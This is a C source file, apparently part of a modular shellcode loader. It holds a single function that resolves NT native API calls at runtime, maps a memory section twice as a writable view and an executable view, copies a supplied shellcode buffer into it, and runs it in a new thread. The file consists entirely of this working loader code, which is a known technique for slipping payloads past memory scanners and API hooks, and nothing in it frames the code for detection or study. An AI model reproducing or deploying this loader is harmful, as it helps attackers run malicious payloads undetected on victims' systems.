#include "../config.h"
#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_section_map(unsigned char *sc, size_t len) {
    fnNtCreateSection pCreateSection =
        (fnNtCreateSection)ntapi_resolve("NtCreateSection");
    fnNtMapViewOfSection pMapView =
        (fnNtMapViewOfSection)ntapi_resolve("NtMapViewOfSection");
    fnNtCreateThreadEx pThread =
        (fnNtCreateThreadEx)ntapi_resolve("NtCreateThreadEx");
    fnNtWaitForSingleObject pWait =
        (fnNtWaitForSingleObject)ntapi_resolve("NtWaitForSingleObject");
    if (!pCreateSection || !pMapView || !pThread || !pWait) return FALSE;

    LARGE_INTEGER secSize;
    secSize.QuadPart = len;

    HANDLE hSection = NULL;
    if (!NT_SUCCESS(pCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                   &secSize, PAGE_EXECUTE_READWRITE,
                                   SEC_COMMIT, NULL)))
        return FALSE;

    PVOID rwView = NULL;
    SIZE_T viewSize = 0;
    if (!NT_SUCCESS(pMapView(hSection, (HANDLE)-1, &rwView, 0, 0, NULL,
                             &viewSize, 1, 0, PAGE_READWRITE))) {
        CloseHandle(hSection);
        return FALSE;
    }

    memcpy(rwView, sc, len);

    PVOID rxView = NULL;
    viewSize = 0;
    if (!NT_SUCCESS(pMapView(hSection, (HANDLE)-1, &rxView, 0, 0, NULL,
                             &viewSize, 1, 0, PAGE_EXECUTE_READ))) {
        CloseHandle(hSection);
        return FALSE;
    }

    HANDLE hThread = NULL;
    if (!NT_SUCCESS(pThread(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                            rxView, NULL, 0, 0, 0, 0, NULL))) {
        CloseHandle(hSection);
        return FALSE;
    }

    pWait(hThread, FALSE, NULL);
    CloseHandle(hThread);
    CloseHandle(hSection);
    return TRUE;
}
